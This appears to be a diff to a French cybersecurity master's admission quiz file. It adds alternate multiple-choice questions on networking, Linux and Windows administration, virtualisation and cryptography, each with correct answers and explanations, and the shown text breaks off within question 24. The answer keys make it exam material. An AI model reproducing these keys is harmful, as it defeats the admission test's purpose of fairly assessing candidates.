@@ -1,11 +1,20 @@
 {
  "title": "Admission Mastère Cybersécurité (M1) 2026",
- "description": "QCM d'admission Mastère Cyber, entrée M1 (proposition de Dylan, v2, relue). 50 minutes, 1 point par question ; questions à plusieurs réponses : tout ou rien. Niveau visé : sortie de Bac+3 (Licence ou BUT informatique, TP AIS, Bachelor cyber). Seuil d'admissibilité proposé : 25/50.",
- "duration_minutes": 50,
- "pass_mark": 25,
+ "description": "QCM d'admission Mastère Cyber, entrée M1 (proposition de Dylan, v2, relue). 58 minutes, 1 point par question ; questions à plusieurs réponses : tout ou rien. Niveau visé : sortie de Bac+3 (Licence ou BUT informatique, TP AIS, Bachelor cyber). Plus une mission terminal de 8 minutes (4 points). Seuil d'admissibilité proposé : 27/54.",
+ "duration_minutes": 58,
+ "pass_mark": 27,
+ "domain_floors": {
+  "Analyse et diagnostic": 0.3,
+  "Cybersécurité": 0.3,
+  "Programmation et scripting": 0.3,
+  "Réseaux": 0.3,
+  "Systèmes": 0.3
+ },
  "questions": [
   {
    "position": 1,
+   "variant_group": "mastere-q01",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Quelle est l'adresse de broadcast du réseau 172.16.0.0/22 ?",
@@ -34,7 +43,40 @@
    "explanation": "Un /22 couvre 4 blocs de 256 adresses : de 172.16.0.0 à 172.16.3.255. La dernière adresse est le broadcast."
   },
   {
+   "position": 1,
+   "variant_group": "mastere-q01",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Quelle est l'adresse de broadcast du réseau 10.20.8.0/21 ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "10.20.8.255"
+    },
+    {
+     "id": "b",
+     "text": "10.20.16.255"
+    },
+    {
+     "id": "c",
+     "text": "10.20.15.255"
+    },
+    {
+     "id": "d",
+     "text": "10.20.255.255"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "Un /21 couvre 8 blocs de 256 adresses : de 10.20.8.0 à 10.20.15.255. La dernière adresse est le broadcast."
+  },
+  {
    "position": 2,
+   "variant_group": "mastere-q02",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Vous devez créer un sous-réseau pour 50 hôtes en gaspillant le moins d'adresses possible. Quel préfixe choisissez-vous ?",
@@ -63,7 +105,40 @@
    "explanation": "/26 = 62 hôtes utilisables (suffisant) ; /27 = 30 hôtes (insuffisant) ; /25 = 126 hôtes (gaspillage)."
   },
   {
+   "position": 2,
+   "variant_group": "mastere-q02",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Vous devez créer un sous-réseau pour 100 hôtes en gaspillant le moins d'adresses possible. Quel préfixe choisissez-vous ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "/26"
+    },
+    {
+     "id": "b",
+     "text": "/24"
+    },
+    {
+     "id": "c",
+     "text": "/27"
+    },
+    {
+     "id": "d",
+     "text": "/25"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "/25 = 126 hôtes utilisables (suffisant) ; /26 = 62 hôtes (insuffisant) ; /24 = 254 hôtes (gaspillage)."
+  },
+  {
    "position": 3,
+   "variant_group": "mastere-q03",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Un routeur possède ces routes :\n10.0.0.0/8 via R1\n10.1.0.0/16 via R2\n10.1.2.0/24 via R3\n0.0.0.0/0 via R4\nPar où part un paquet à destination de 10.1.2.45 ?",
@@ -92,7 +167,40 @@
    "explanation": "Le routeur choisit la route la plus précise (préfixe le plus long) qui contient la destination : 10.1.2.0/24."
   },
   {
+   "position": 3,
+   "variant_group": "mastere-q03",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Un routeur possède ces routes :\n172.16.0.0/12 via R1\n172.16.32.0/19 via R2\n172.16.48.0/21 via R3\n0.0.0.0/0 via R4\nPar où part un paquet à destination de 172.16.60.9 ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "R1"
+    },
+    {
+     "id": "b",
+     "text": "R2"
+    },
+    {
+     "id": "c",
+     "text": "R3"
+    },
+    {
+     "id": "d",
+     "text": "R4"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "172.16.48.0/21 s'arrête à 172.16.55.255 et ne contient pas la destination. La route la plus précise qui la contient est 172.16.32.0/19 (de .32.0 à .63.255)."
+  },
+  {
    "position": 4,
+   "variant_group": "mastere-q04",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Quel mécanisme remplace ARP en IPv6 pour trouver l'adresse MAC d'un voisin ?",
@@ -121,7 +229,40 @@
    "explanation": "IPv6 n'utilise pas ARP : la découverte des voisins passe par NDP, qui s'appuie sur des messages ICMPv6."
   },
   {
+   "position": 4,
+   "variant_group": "mastere-q04",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "En IPv6, quel type d'adresse remplace la diffusion (broadcast) d'IPv4 ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le multicast (adresses du bloc ff00::/8)"
+    },
+    {
+     "id": "b",
+     "text": "L'anycast (une adresse partagée par plusieurs nœuds)"
+    },
+    {
+     "id": "c",
+     "text": "Le broadcast étendu (adresse ffff:ffff::/32)"
+    },
+    {
+     "id": "d",
+     "text": "L'adresse lien-local (bloc fe80::/10) de l'interface"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "IPv6 ne connaît pas le broadcast : les envois à plusieurs destinataires passent par le multicast, par exemple ff02::1 pour tous les nœuds du lien."
+  },
+  {
    "position": 5,
+   "variant_group": "mastere-q05",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Quel est l'ordre des messages lors de l'ouverture d'une connexion TCP ?",
@@ -150,7 +291,40 @@
    "explanation": "Poignée de main en trois temps : le client envoie SYN, le serveur répond SYN-ACK, le client confirme par ACK."
   },
   {
+   "position": 5,
+   "variant_group": "mastere-q05",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Un client envoie un segment SYN vers un port TCP fermé d'un serveur, sans pare-feu sur le chemin. Que reçoit-il en retour ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Un segment SYN-ACK"
+    },
+    {
+     "id": "b",
+     "text": "Un segment RST"
+    },
+    {
+     "id": "c",
+     "text": "Un segment FIN"
+    },
+    {
+     "id": "d",
+     "text": "Un segment ACK seul"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "Un port fermé refuse la connexion par un segment RST. Un SYN-ACK indiquerait au contraire un port ouvert."
+  },
+  {
    "position": 6,
+   "variant_group": "mastere-q06",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Un serveur web répond sur le port 443 depuis le réseau interne, mais pas depuis Internet via l'adresse IP publique. Le service fonctionne. Quelle est la cause la plus probable ?",
@@ -179,7 +353,40 @@
    "explanation": "Le service fonctionne en interne : le blocage se situe entre Internet et le serveur. Un certificat expiré provoquerait une alerte, pas une absence de connexion."
   },
   {
+   "position": 6,
+   "variant_group": "mastere-q06",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Depuis Internet, un site répond quand on saisit son adresse IP publique, mais pas quand on saisit son nom de domaine. En interne, tout fonctionne. Quelle est la cause la plus probable ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "La redirection de port (NAT) manque sur le pare-feu périmétrique"
+    },
+    {
+     "id": "b",
+     "text": "Le certificat TLS du serveur a expiré et bloque les connexions"
+    },
+    {
+     "id": "c",
+     "text": "L'enregistrement DNS public du site est absent ou pointe ailleurs"
+    },
+    {
+     "id": "d",
+     "text": "Le service web est arrêté sur le serveur depuis la mise à jour"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "L'accès par l'IP publique prouve que le NAT, le pare-feu et le service fonctionnent : seule la résolution du nom depuis Internet échoue."
+  },
+  {
    "position": 7,
+   "variant_group": "mastere-q07",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Qu'apporte la segmentation en VLAN du point de vue de la sécurité ?",
@@ -208,7 +415,40 @@
    "explanation": "Le VLAN isole des segments ; le filtrage se fait au point de routage entre VLAN. Il ne chiffre rien et ne protège pas contre les attaques au sein d'un même VLAN."
   },
   {
+   "position": 7,
+   "variant_group": "mastere-q07",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Pourquoi place-t-on les serveurs exposés à Internet dans une DMZ ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Pour qu'un serveur compromis ne donne pas un accès direct au réseau interne, les flux étant filtrés"
+    },
+    {
+     "id": "b",
+     "text": "Pour que le trafic entre Internet et les serveurs soit automatiquement chiffré de bout en bout"
+    },
+    {
+     "id": "c",
+     "text": "Pour dispenser ces serveurs des mises à jour de sécurité, la DMZ les protégeant déjà"
+    },
+    {
+     "id": "d",
+     "text": "Pour accélérer les échanges en évitant le passage des flux par le pare-feu"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "La DMZ est une zone intermédiaire : les flux entre elle et le réseau interne sont filtrés, ce qui limite les rebonds d'un attaquant. Elle ne chiffre rien et ne remplace pas les correctifs."
+  },
+  {
    "position": 8,
+   "variant_group": "mastere-q08",
+   "variant": "A",
    "type": "mcq_multi",
    "domain": "Réseaux",
    "prompt": "Cochez les protocoles applicatifs qui s'appuient sur TCP (plusieurs réponses possibles) :",
@@ -238,7 +478,41 @@
    "explanation": "SSH (TCP 22) et SMTP (TCP 25) utilisent TCP. SNMP (UDP 161) et TFTP (UDP 69) utilisent UDP."
   },
   {
+   "position": 8,
+   "variant_group": "mastere-q08",
+   "variant": "B",
+   "type": "mcq_multi",
+   "domain": "Réseaux",
+   "prompt": "Cochez les protocoles qui utilisent UDP par défaut (plusieurs réponses possibles) :",
+   "options": [
+    {
+     "id": "a",
+     "text": "IMAP (messagerie)"
+    },
+    {
+     "id": "b",
+     "text": "NTP (synchronisation horaire)"
+    },
+    {
+     "id": "c",
+     "text": "FTP (transfert de fichiers)"
+    },
+    {
+     "id": "d",
+     "text": "Syslog (journalisation)"
+    }
+   ],
+   "correct": [
+    "b",
+    "d"
+   ],
+   "points": 1,
+   "explanation": "NTP (UDP 123) et Syslog (UDP 514) utilisent UDP. IMAP (TCP 143) et FTP (TCP 21) utilisent TCP."
+  },
+  {
    "position": 9,
+   "variant_group": "mastere-q09",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Les postes résolvent correctement les noms internes de l'entreprise, mais aucun nom Internet. Où cherchez-vous en priorité ?",
@@ -267,7 +541,40 @@
    "explanation": "La zone interne fonctionne : c'est la transmission des requêtes externes (redirecteurs, récursion, accès sortant du DNS) qui échoue."
   },
   {
+   "position": 9,
+   "variant_group": "mastere-q09",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "Un seul poste résout les noms Internet mais aucun nom interne (intranet.corp.local) ; les autres postes fonctionnent. Où cherchez-vous en priorité ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Dans les redirecteurs configurés sur le serveur DNS interne"
+    },
+    {
+     "id": "b",
+     "text": "Dans les enregistrements A de la zone DNS interne"
+    },
+    {
+     "id": "c",
+     "text": "Dans la table de routage du routeur de sortie Internet"
+    },
+    {
+     "id": "d",
+     "text": "Dans les serveurs DNS configurés sur ce poste"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Le problème ne touche qu'un poste : il interroge probablement un DNS public (configuration manuelle ou erronée) qui ne connaît pas la zone interne."
+  },
+  {
    "position": 10,
+   "variant_group": "mastere-q10",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Réseaux",
    "prompt": "Dans quel ordre se déroulent les échanges DHCP quand un poste obtient une adresse ?",
@@ -296,7 +603,40 @@
    "explanation": "Processus DORA : le client cherche un serveur (Discover), reçoit une offre (Offer), la demande (Request), le serveur confirme (Acknowledge)."
   },
   {
+   "position": 10,
+   "variant_group": "mastere-q10",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Réseaux",
+   "prompt": "La commande ipconfig d'un poste Windows affiche l'adresse 169.254.12.7. Qu'en concluez-vous ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le poste n'a reçu aucune réponse d'un serveur DHCP"
+    },
+    {
+     "id": "b",
+     "text": "Le poste a reçu une adresse de secours du serveur DHCP"
+    },
+    {
+     "id": "c",
+     "text": "Le poste est connecté à un VLAN réservé aux invités"
+    },
+    {
+     "id": "d",
+     "text": "Le poste a une adresse IPv4 publique attribuée par le FAI"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "169.254.0.0/16 est la plage APIPA : Windows s'attribue seul une adresse lien-local quand aucun serveur DHCP ne répond."
+  },
+  {
    "position": 11,
+   "variant_group": "mastere-q11",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Sous Linux, un fichier exécutable a les droits -rwsr-xr-x. Que signifie le « s » ?",
@@ -325,7 +665,40 @@
    "explanation": "Le SUID sur un binaire appartenant à root lui donne les droits root à l'exécution : c'est une cible classique d'élévation de privilèges."
   },
   {
+   "position": 11,
+   "variant_group": "mastere-q11",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Sous Linux, le répertoire /tmp a les droits drwxrwxrwt. Que signifie le « t » final ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le bit SUID : les programmes du répertoire s'exécutent avec les droits du propriétaire"
+    },
+    {
+     "id": "b",
+     "text": "Le répertoire est temporaire et vidé automatiquement à chaque redémarrage"
+    },
+    {
+     "id": "c",
+     "text": "Le sticky bit : chacun ne peut supprimer que ses propres fichiers dans le répertoire"
+    },
+    {
+     "id": "d",
+     "text": "Le bit SGID : les fichiers créés héritent du groupe propriétaire du répertoire"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "Sur un répertoire partagé, le sticky bit empêche un utilisateur de supprimer ou renommer les fichiers des autres, même s'il a le droit d'écriture."
+  },
+  {
    "position": 12,
+   "variant_group": "mastere-q12",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Que fait la commande ss -tulpn sous Linux ?",
@@ -354,7 +727,40 @@
    "explanation": "t = TCP, u = UDP, l = en écoute, p = processus, n = affichage numérique. ss remplace netstat."
   },
   {
+   "position": 12,
+   "variant_group": "mastere-q12",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Que fait la commande lsof -i :8080 sous Linux ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Elle ouvre le port 8080 dans le pare-feu local"
+    },
+    {
+     "id": "b",
+     "text": "Elle affiche les processus qui utilisent le port 8080"
+    },
+    {
+     "id": "c",
+     "text": "Elle teste si le port 8080 d'un hôte distant répond"
+    },
+    {
+     "id": "d",
+     "text": "Elle ferme toutes les connexions établies sur le port 8080"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "lsof liste les fichiers ouverts ; avec -i :8080, il montre les processus en écoute ou connectés sur ce port."
+  },
+  {
    "position": 13,
+   "variant_group": "mastere-q13",
+   "variant": "A",
    "type": "mcq_multi",
    "domain": "Systèmes",
    "prompt": "Cochez les mesures qui renforcent la sécurité d'un serveur SSH (plusieurs réponses possibles) :",
@@ -385,7 +791,42 @@
    "explanation": "Les mots de passe vides ouvrent l'accès sans authentification. Les trois autres mesures réduisent la surface d'attaque."
   },
   {
+   "position": 13,
+   "variant_group": "mastere-q13",
+   "variant": "B",
+   "type": "mcq_multi",
+   "domain": "Systèmes",
+   "prompt": "Cochez les mesures qui réduisent la surface d'attaque d'un serveur web Linux exposé à Internet (plusieurs réponses possibles) :",
+   "options": [
+    {
+     "id": "a",
+     "text": "Désactiver les services et paquets inutiles"
+    },
+    {
+     "id": "b",
+     "text": "Appliquer régulièrement les mises à jour de sécurité"
+    },
+    {
+     "id": "c",
+     "text": "Mettre les droits 777 sur le répertoire du site"
+    },
+    {
+     "id": "d",
+     "text": "Exécuter le service web avec un compte dédié non privilégié"
+    }
+   ],
+   "correct": [
+    "a",
+    "b",
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Les droits 777 permettent à n'importe quel compte de modifier le site. Les trois autres mesures limitent ce qu'un attaquant peut exploiter."
+  },
+  {
    "position": 14,
+   "variant_group": "mastere-q14",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Quel protocole d'authentification est utilisé par défaut dans un domaine Active Directory ?",
@@ -414,7 +855,40 @@
    "explanation": "Kerberos est le protocole par défaut ; NTLM reste un mécanisme de repli. LDAP sert à interroger l'annuaire, pas à authentifier par défaut."
   },
   {
+   "position": 14,
+   "variant_group": "mastere-q14",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Dans un domaine Active Directory, quel port doit être joignable par les postes clients pour obtenir des tickets Kerberos auprès du contrôleur de domaine ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "389"
+    },
+    {
+     "id": "b",
+     "text": "445"
+    },
+    {
+     "id": "c",
+     "text": "636"
+    },
+    {
+     "id": "d",
+     "text": "88"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Kerberos utilise le port 88 (TCP et UDP). 389 et 636 servent à LDAP et LDAPS, 445 à SMB."
+  },
+  {
    "position": 15,
+   "variant_group": "mastere-q15",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Sous Windows, quelle commande affiche les privilèges (droits) de l'utilisateur courant ?",
@@ -443,7 +917,40 @@
    "explanation": "whoami /priv affiche les privilèges du jeton de l'utilisateur, par exemple SeDebugPrivilege, utile en audit comme en élévation de privilèges."
   },
   {
+   "position": 15,
+   "variant_group": "mastere-q15",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Sous Windows, quelle commande liste les membres du groupe local des administrateurs ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "whoami /groups"
+    },
+    {
+     "id": "b",
+     "text": "net user Administrateur"
+    },
+    {
+     "id": "c",
+     "text": "net localgroup Administrateurs"
+    },
+    {
+     "id": "d",
+     "text": "gpresult /scope user"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "net localgroup suivi du nom du groupe en affiche les membres (Administrators sur un système en anglais). C'est une vérification courante lors d'un audit de droits."
+  },
+  {
    "position": 16,
+   "variant_group": "mastere-q16",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Lequel de ces produits est un hyperviseur de type 1 ?",
@@ -472,7 +979,40 @@
    "explanation": "Un hyperviseur de type 1 s'exécute directement sur le matériel (ESXi, Proxmox/KVM, Hyper-V). VirtualBox et Workstation sont de type 2 ; Docker n'est pas un hyperviseur."
   },
   {
+   "position": 16,
+   "variant_group": "mastere-q16",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Parmi ces solutions de virtualisation, laquelle est un hyperviseur de type 1 (bare metal) ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Microsoft Hyper-V (rôle Windows Server)"
+    },
+    {
+     "id": "b",
+     "text": "VMware Fusion"
+    },
+    {
+     "id": "c",
+     "text": "Parallels Desktop"
+    },
+    {
+     "id": "d",
+     "text": "Podman (moteur de conteneurs)"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "Hyper-V s'exécute directement sur le matériel. Fusion et Parallels sont des hyperviseurs de type 2 installés sur macOS ; Podman gère des conteneurs."
+  },
+  {
    "position": 17,
+   "variant_group": "mastere-q17",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Quelle est la principale différence entre un conteneur et une machine virtuelle ?",
@@ -501,7 +1041,40 @@
    "explanation": "Le partage du noyau rend le conteneur léger, mais son isolation est plus faible que celle d'une VM : une faille du noyau touche tous les conteneurs."
   },
   {
+   "position": 17,
+   "variant_group": "mastere-q17",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Pourquoi une image de conteneur Linux ne peut-elle pas s'exécuter nativement sur un hôte Windows, sans couche de virtualisation (WSL2 ou VM) ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Parce que les images Linux sont chiffrées et illisibles par Windows"
+    },
+    {
+     "id": "b",
+     "text": "Parce que le conteneur utilise le noyau de l'hôte, qui doit être Linux"
+    },
+    {
+     "id": "c",
+     "text": "Parce que Windows ne sait pas créer de réseau virtuel pour un conteneur"
+    },
+    {
+     "id": "d",
+     "text": "Parce que l'image doit d'abord être convertie au format de disque VMDK"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "Un conteneur n'embarque pas de noyau : il partage celui de l'hôte. Un conteneur Linux a donc besoin d'un noyau Linux, fourni sous Windows par WSL2 ou une VM."
+  },
+  {
    "position": 18,
+   "variant_group": "mastere-q18",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Dans un plan de continuité, que désigne le RPO ?",
@@ -530,7 +1103,40 @@
    "explanation": "RPO (Recovery Point Objective) = données qu'on accepte de perdre. RTO (Recovery Time Objective) = durée d'interruption acceptable."
   },
   {
+   "position": 18,
+   "variant_group": "mastere-q18",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Une entreprise sauvegarde sa base de données toutes les 4 heures. Quel objectif cette fréquence permet-elle de respecter ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Un RTO de 4 heures au plus"
+    },
+    {
+     "id": "b",
+     "text": "Une disponibilité de 99,9 %"
+    },
+    {
+     "id": "c",
+     "text": "Un délai de notification de 4 heures"
+    },
+    {
+     "id": "d",
+     "text": "Un RPO de 4 heures au plus"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Le RPO mesure la perte de données admissible : avec une sauvegarde toutes les 4 heures, on perd au pire 4 heures de données. Le RTO, lui, porte sur la durée de remise en service."
+  },
+  {
    "position": 19,
+   "variant_group": "mastere-q19",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Que fait la commande journalctl -u nginx --since \"1 hour ago\" ?",
@@ -559,7 +1165,40 @@
    "explanation": "-u filtre par unité systemd, --since limite la période affichée."
   },
   {
+   "position": 19,
+   "variant_group": "mastere-q19",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Que fait la commande tail -f /var/log/nginx/access.log ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Elle affiche le début du fichier puis s'arrête"
+    },
+    {
+     "id": "b",
+     "text": "Elle vide le journal d'accès de nginx"
+    },
+    {
+     "id": "c",
+     "text": "Elle affiche la fin du journal et suit les nouvelles lignes en direct"
+    },
+    {
+     "id": "d",
+     "text": "Elle recherche les erreurs dans le journal d'accès"
+    }
+   ],
+   "correct": [
+    "c"
+   ],
+   "points": 1,
+   "explanation": "tail affiche les dernières lignes ; l'option -f (follow) continue d'afficher les lignes ajoutées au fil de l'eau."
+  },
+  {
    "position": 20,
+   "variant_group": "mastere-q20",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Systèmes",
    "prompt": "Votre entreprise utilise une messagerie en SaaS (par exemple Microsoft 365). Qui est responsable de la gestion des comptes, du MFA et des droits d'accès des utilisateurs ?",
@@ -588,7 +1227,40 @@
    "explanation": "Même en SaaS, le client reste responsable de ses identités, de ses accès et de ses données. Le fournisseur gère l'infrastructure et l'application. Beaucoup de compromissions de messagerie viennent de comptes sans MFA."
   },
   {
+   "position": 20,
+   "variant_group": "mastere-q20",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Systèmes",
+   "prompt": "Votre entreprise loue des machines virtuelles chez un fournisseur IaaS. Qui doit appliquer les correctifs de sécurité du système d'exploitation de ces VM ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Le fournisseur IaaS"
+    },
+    {
+     "id": "b",
+     "text": "Le client"
+    },
+    {
+     "id": "c",
+     "text": "L'éditeur de l'OS"
+    },
+    {
+     "id": "d",
+     "text": "Personne, c'est automatique"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
+   "explanation": "En IaaS, le fournisseur gère le matériel et la virtualisation ; le client administre le système invité, ses correctifs, ses comptes et ses données."
+  },
+  {
    "position": 21,
+   "variant_group": "mastere-q21",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Bob veut envoyer à Alice un message que seule Alice pourra lire. Avec quelle clé le chiffre-t-il ?",
@@ -617,7 +1289,40 @@
    "explanation": "On chiffre avec la clé publique du destinataire ; seule sa clé privée permet de déchiffrer. Bob n'a d'ailleurs pas accès à la clé privée d'Alice."
   },
   {
+   "position": 21,
+   "variant_group": "mastere-q21",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Alice veut signer un document pour que Bob puisse vérifier qu'il vient bien d'elle. Avec quelle clé signe-t-elle ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "La clé privée d'Alice"
+    },
+    {
+     "id": "b",
+     "text": "La clé publique d'Alice"
+    },
+    {
+     "id": "c",
+     "text": "La clé publique de Bob"
+    },
+    {
+     "id": "d",
+     "text": "La clé privée de Bob"
+    }
+   ],
+   "correct": [
+    "a"
+   ],
+   "points": 1,
+   "explanation": "On signe avec sa propre clé privée, que l'on est seul à détenir ; le destinataire vérifie la signature avec la clé publique de l'émetteur."
+  },
+  {
    "position": 22,
+   "variant_group": "mastere-q22",
+   "variant": "A",
    "type": "mcq_multi",
    "domain": "Cybersécurité",
    "prompt": "Cochez ce que garantit une signature numérique (plusieurs réponses possibles) :",
@@ -647,7 +1352,41 @@
    "explanation": "La signature prouve que le message n'a pas été modifié et qui l'a signé (non-répudiation). Elle ne chiffre pas le contenu."
   },
   {
+   "position": 22,
+   "variant_group": "mastere-q22",
+   "variant": "B",
+   "type": "mcq_multi",
+   "domain": "Cybersécurité",
+   "prompt": "Cochez les propriétés d'une fonction de hachage cryptographique comme SHA-256 (plusieurs réponses possibles) :",
+   "options": [
+    {
+     "id": "a",
+     "text": "L'empreinte a une taille fixe, quelle que soit la taille de l'entrée"
+    },
+    {
+     "id": "b",
+     "text": "L'empreinte se déchiffre avec la bonne clé pour retrouver l'entrée"
+    },
+    {
+     "id": "c",
+     "text": "Retrouver l'entrée à partir de l'empreinte est irréalisable en pratique"
+    },
+    {
+     "id": "d",
+     "text": "L'empreinte prouve à elle seule l'identité de l'émetteur du fichier"
+    }
+   ],
+   "correct": [
+    "a",
+    "c"
+   ],
+   "points": 1,
+   "explanation": "Un hachage est à sens unique et de taille fixe (256 bits pour SHA-256). Il n'utilise pas de clé et n'authentifie pas l'émetteur sans signature ni HMAC."
+  },
+  {
    "position": 23,
+   "variant_group": "mastere-q23",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Pourquoi MD5 n'est-il plus utilisé pour garantir l'intégrité en sécurité ?",
@@ -676,7 +1415,40 @@
    "explanation": "Les collisions MD5 (et SHA-1) sont réalisables en pratique. On utilise SHA-256 ou plus."
   },
   {
+   "position": 23,
+   "variant_group": "mastere-q23",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Pourquoi est-il déconseillé de stocker les mots de passe sous forme d'empreinte SHA-256 simple, sans sel ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "SHA-256 est réversible : l'empreinte redonne le mot de passe"
+    },
+    {
+     "id": "b",
+     "text": "SHA-256 n'est pas pris en charge par les bases de données"
+    },
+    {
+     "id": "c",
+     "text": "SHA-256 produit facilement des collisions entre deux mots de passe"
+    },
+    {
+     "id": "d",
+     "text": "Le calcul est rapide et non salé : dictionnaires et tables précalculées marchent"
+    }
+   ],
+   "correct": [
+    "d"
+   ],
+   "points": 1,
+   "explanation": "Un hachage rapide sans sel permet de tester des milliards de candidats et de repérer les mots de passe identiques. On utilise une fonction lente et salée (Argon2, bcrypt, scrypt, PBKDF2)."
+  },
+  {
    "position": 24,
+   "variant_group": "mastere-q24",
+   "variant": "A",
    "type": "mcq_single",
    "domain": "Cybersécurité",
    "prompt": "Dans une connexion HTTPS, à quoi sert principalement le certificat du serveur ?",
@@ -705,7 +1477,40 @@
    "explanation": "Le certificat authentifie le serveur. Les données sont chiffrées avec des clés de session symétriques (AES, ChaCha20) négociées par échange de clés (ECDHE en TLS 1.3)."
   },
   {
+   "position": 24,
+   "variant_group": "mastere-q24",
+   "variant": "B",
+   "type": "mcq_single",
+   "domain": "Cybersécurité",
+   "prompt": "Une fois la négociation TLS terminée, comment les données applicatives échangées sont-elles chiffrées ?",
+   "options": [
+    {
+     "id": "a",
+     "text": "Avec la clé publique du certificat du serveur"
+    },
+    {
+     "id": "b",
+     "text": "Avec des clés de session symétriques négociées"
+    },
+    {
+     "id": "c",
+     "text": "Avec la clé privée de l'autorité de certification"
+    },
+    {
+     "id": "d",
+     "text": "Avec l'empreinte SHA-256 du certificat du serveur"
+    }
+   ],
+   "correct": [
+    "b"
+   ],
+   "points": 1,
